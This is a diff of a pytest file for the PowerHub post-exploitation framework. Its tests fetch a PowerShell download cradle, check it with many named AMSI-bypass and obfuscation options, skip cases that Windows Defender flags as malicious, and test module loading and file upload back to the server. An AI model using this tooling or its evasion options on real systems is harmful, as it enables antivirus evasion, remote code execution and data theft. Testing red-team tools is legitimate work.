@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import logging
 import os
 import sys
 import time
@@ -14,71 +15,39 @@ import bs4
 
 # https://stackoverflow.com/a/33515264/1308830
 sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
-from test_init import TEST_URI, TEST_COMMANDS, init_tests, execute_cmd  # noqa
+from test_init import TEST_URI, BACKENDS, init_tests, execute_cmd  # noqa
 
+log = logging.getLogger(__name__)
 
 MAX_TEST_MODULE_PS1 = 103
 
 init_tests()
 
 
-def get_stager():
-    result = {}
+def get_stager(**params):
     PORT = '8080'
-    param_set = {
-        'default': {
-            "flavor": "hub",
-            "launcher": "powershell",
-            "amsi": "reflection",
-            "transport": "http",
-            "clip-exec": "none",
-            "proxy": "false",
-            "tlsv1.2": "false",
-            "fingerprint": "true",
-            "noverification": "false",
-            "certStore": "false",
-        },
-        'HTTPS': {
-            "flavor": "hub",
-            "launcher": "powershell",
-            "amsi": "reflection",
-            "transport": "https",
-            "clip-exec": "none",
-            "proxy": "false",
-            "tlsv1.2": "false",
-            "fingerprint": "true",
-            "noverification": "false",
-            "certStore": "false",
-        },
-        'BASH': {
-            "flavor": "hub",
-            "launcher": "bash",
-            "amsi": "reflection",
-            "transport": "http",
-            "clip-exec": "none",
-            "proxy": "false",
-            "tlsv1.2": "false",
-            "fingerprint": "true",
-            "noverification": "false",
-            "certStore": "false",
-        },
-    }
     i = 0
+    if 'transport' not in params:
+        # change default transport method because old Windows OS refuse to
+        # use TLS1.2 by default
+        params['transport'] = 'http'
+
+    # Make 10 attempts
     while i < 10:
         try:
-            for k, v in param_set.items():
-                response = requests.get(
-                    f"http://{TEST_URI}:{PORT}/dlcradle",
-                    params=v,
-                    headers={'Accept': 'text/html'},
-                ).text
-                soup = bs4.BeautifulSoup(response, features='lxml')
-                result[k] = soup.find('code').getText()
+            response = requests.get(
+                f"http://{TEST_URI}:{PORT}/dlcradle",
+                params=params,
+                headers={'Accept': 'text/html'},
+            ).text
+            soup = bs4.BeautifulSoup(response, features='lxml')
+            result = soup.find('code').getText()
             break
         except requests.exceptions.ConnectionError:
             i += 1
             time.sleep(.5)
-    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'", '\\"')
+
+    result += ';'
     return result
 
 
@@ -94,7 +63,7 @@ def create_modules():
 
 
 @pytest.fixture(scope="module")
-def full_app():
+def stager():
     with tempfile.TemporaryDirectory(
         prefix='powerhub_tests',
         ignore_cleanup_errors=True,
@@ -109,60 +78,88 @@ def full_app():
         app.run(background=True)
         create_modules()
 
-        yield get_stager()
+        yield get_stager
 
         app.stop()
 
 
-def test_stager(full_app):
-    assert "New-Object Net.WebClient" in full_app['default']
-    assert f"DownloadString('https://{TEST_URI}:" in full_app['default']
+def test_stager(stager):
+    assert "New-Object Net.WebClient" in stager()
+    assert f"DownloadString('https://{TEST_URI}:" in stager(transport='https')
     assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
-    ) in (full_app['HTTPS'])
+    ) in stager(transport='https')
 
 
-@pytest.fixture(scope="module")
-def backends(full_app):
-    # win10 uses ssh
-    win10cmd = TEST_COMMANDS["win10"] % full_app
-    # Insert formatter for extra command
-    win10cmd = win10cmd.replace('%', '%%')
-    win10cmd = win10cmd[:-2] + ';%s' + win10cmd[-2:]
+@pytest.fixture(scope="module", params=list(BACKENDS.keys()))
+def backend(request):
+    """Parameterize backends"""
+    return BACKENDS[request.param]
 
-    # win7 uses wmiexec
-    win7cmd = TEST_COMMANDS["win7"] % full_app
-    win7cmd = win7cmd.replace('\\$', '$')
-    win7cmd = win7cmd.replace('%', '%%')
-    # Insert formatter for extra command
-    win7cmd = win7cmd[:-3] + ';%s' + win7cmd[-3:]
 
-    return {
-        "win10": lambda c: win10cmd % c.replace('"', '\\"'),
-        "win7": lambda c: win7cmd % c.replace('"', "'"),
+def test_start(backend, stager):
+    param_set = {
+        'default': dict(),
     }
 
+    for amsi_bypass in [
+        'reflection',
+        'reflection2',
+        'rasta-mouse',
+        'zc00l',
+        'none',
+    ]:
+        param_set[amsi_bypass] = dict(amsi=amsi_bypass)
 
-@pytest.fixture(scope="module", params=["win10"])
-def backend(request, backends):
-    """Parameterize backends"""
-    return backends[request.param]
+    for kex in [
+        'oob',
+        'embedded',
+    ]:
+        param_set[kex] = dict(kex=kex)
+
+    for checkbox in [
+        'minimal',
+        'natural',
+        'incremental',
+        'obfuscate_setalias',
+        'slowenc',
+        'useragent',
+    ]:
+        param_set[checkbox] = {checkbox: 'true'}
+
+    if backend['psversion'] >= 5:
+        # These features will produce stagers incompatible with PSv2
+        for amsi_bypass in [
+            'am0nsec',
+            'adam-chester',
+        ]:
+            param_set[amsi_bypass] = dict(amsi=amsi_bypass)
+
+        param_set['decoy'] = {'decoy': 'true'}
+        param_set['dh'] = dict(kex='dh')
+
+    for k, v in param_set.items():
+        log.info("Testing param_set %s" % k)
+        out = execute_cmd(backend, stager(**v) + "")
+        # Some features are known to be caught by defender
+        if (
+            backend['psversion'] >= 5 and
+            'This script contains malicious content' in out and
+            ({'zc00l', 'reflection2', 'adam-chester', 'none'} & set(v.values()))
+        ):
+            continue
+        assert "Adrian Vollmer" in out
+        assert "Run 'Help-PowerHub' for help" in out
 
 
-def test_start(backend):
-    out = execute_cmd(backend(""))
-    assert "Adrian Vollmer" in out
-    assert "Run 'Help-PowerHub' for help" in out
-
-
-def test_list_hubmodules(backend):
-    out = execute_cmd(backend("lshm"))
+def test_list_hubmodules(backend, stager):
+    out = execute_cmd(backend, stager() + "lshm")
     for i in range(MAX_TEST_MODULE_PS1):
         assert "psmod%d" % i in out
 
 
-def test_load_hubmodule(backend):
-    out = execute_cmd(backend("ghm psmod53|fl;Invoke-Testfunc53"))
+def test_load_hubmodule(backend, stager):
+    out = execute_cmd(backend, stager() + "ghm psmod53|fl;Invoke-Testfunc53")
     assert "Test53" in out
     assert "psmod53" in out
     assert re.search("Name *: .*psmod53.ps1\r\n", out)
@@ -171,14 +168,13 @@ def test_load_hubmodule(backend):
     assert re.search("Loaded *: True\r\n", out)
 
 
-def test_load_hubmodule_range(backend):
+def test_load_hubmodule_range(backend, stager):
     out = execute_cmd(
-        backend(
-            '$p="72-74,77,90-93";ghm $p;'
-            "Invoke-Testfunc72;Invoke-Testfunc73;Invoke-Testfunc74;"
-            "Invoke-Testfunc77;"
-            "Invoke-Testfunc90;Invoke-Testfunc92;Invoke-Testfunc93;"
-        )
+        backend,
+        stager() + "$p='72-74,77,90-93';ghm $p;"
+        "Invoke-Testfunc72;Invoke-Testfunc73;Invoke-Testfunc74;"
+        "Invoke-Testfunc77;"
+        "Invoke-Testfunc90;Invoke-Testfunc92;Invoke-Testfunc93;"
     )
     assert "Test72" in out
     assert "Test73" in out
@@ -188,13 +184,16 @@ def test_load_hubmodule_range(backend):
     assert "Test93" in out
 
 
-def test_upload(backend):
+def test_upload(backend, stager):
     from powerhub.directories import directories
     testfile = "testfile-%030x.dat" % random.randrange(16**30)
     out = execute_cmd(
-        backend(('$p=Join-Path $env:TEMP "%s";'
-                 + '[io.file]::WriteAllBytes($p,(1..255));'
-                 + 'pth $p;rm $p') % testfile)
+        backend,
+        stager() + (
+            '$p=Join-Path $env:TEMP "%s";'
+            '[io.file]::WriteAllBytes($p,(1..255));'
+            'pth $p;rm $p'
+        ) % testfile
     )
     time.sleep(1)
     assert "At line:" not in out  # "At line:" means PS error
@@ -202,11 +201,13 @@ def test_upload(backend):
         data = f.read()
     assert data == bytes(range(1, 256))
 
+    content = "FooBar123"
     out = execute_cmd(
-        backend('$p="FooBar123";$p|pth -name %s;' % testfile)
+        backend,
+        stager() + "$p='%s';$p|pth -name %s;" % (content, testfile)
     )
     time.sleep(1)
     assert "At line:" not in out  # "At line:" means PS error
-    with open(os.path.join(directories.UPLOAD_DIR, testfile+".1"), "rb") as f:
+    with open(os.path.join(directories.UPLOAD_DIR, testfile+".1"), "r") as f:
         data = f.read()
-    assert data == b"FooBar123"
+    assert data.strip() == content
